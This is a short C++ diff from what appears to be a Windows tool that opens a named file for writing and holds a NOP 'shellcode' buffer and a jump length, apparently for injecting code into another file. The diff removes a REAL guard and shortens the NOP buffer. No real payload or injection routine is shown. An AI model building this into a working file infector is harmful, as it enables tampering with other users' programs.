@@ -4,7 +4,7 @@
 
 #define JMP_LEN 5
 #define DEBUG
-#define REAL
+
 using namespace std;
 
 //
@@ -13,13 +13,12 @@ using namespace std;
 //
 
 int main(int ac, char **av) {
-#ifdef REAL
 	if (ac < 2) {
 		cout << "usage : " << av[0] << " <name_of_file>\n";
 		return 1;
 	}
-#endif
-	char *shellcode = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+
+	char *shellcode = "\x90\x90\x90\x90";
 
 	HANDLE hFile = CreateFileA(av[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (!hFile) {
